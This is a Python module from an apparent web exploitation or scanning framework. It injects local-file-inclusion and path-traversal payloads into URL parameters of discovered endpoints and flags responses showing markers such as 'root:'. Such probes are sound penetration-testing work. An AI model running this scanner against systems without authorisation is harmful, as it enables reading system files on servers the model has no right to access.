from __future__ import annotations

from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from core.module import ExploitModule
from core.models import ExploitResult
from core.payloads import get_payloads


class LFIModule(ExploitModule):
    name = "LFI / Path Traversal"
    category = "filesystem"

    async def run(self, ctx):
        endpoints = ctx.artifacts.get("recon.endpoints", [])
        evidence = []
        probes = get_payloads(self.name)
        payload_counter = 0
        for endpoint in endpoints[:40]:
            parts = urlsplit(endpoint)
            params = parse_qsl(parts.query, keep_blank_values=True)
            for idx, (name, _value) in enumerate(params[:10]):
                for payload in probes:
                    payload_counter += 1
                    ctx.logger(f"[payload {payload_counter}/{len(probes)}] LFI / Path Traversal: {payload}")
                    mutated = params.copy()
                    mutated[idx] = (name, payload)
                    probe = urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(mutated), parts.fragment))
                    try:
                        resp = await ctx.http.request("GET", probe)
                        ctx.inspect_source(str(resp.url), resp.text, payload, payload_counter, resp.headers.get("content-type", ""))
                        hit = "root:" in resp.text.lower() or "localhost" in resp.text.lower() or "linux" in resp.text.lower()
                        evidence.append(f"{probe} -> {resp.status_code}, {len(resp.text)} bytes")
                        if hit:
                            ctx.add_finding(probe, payload, self.name, f"HTTP {resp.status_code}; local-file markers observed", confidence="high")
                            return ExploitResult(self.name, "signal", f"Possible local file read via parameter {name}", evidence=probe)
                    except Exception as exc:
                        evidence.append(str(exc))
        return ExploitResult(self.name, "no-signal", "File-read probes completed", evidence="\n".join(evidence[:20]))
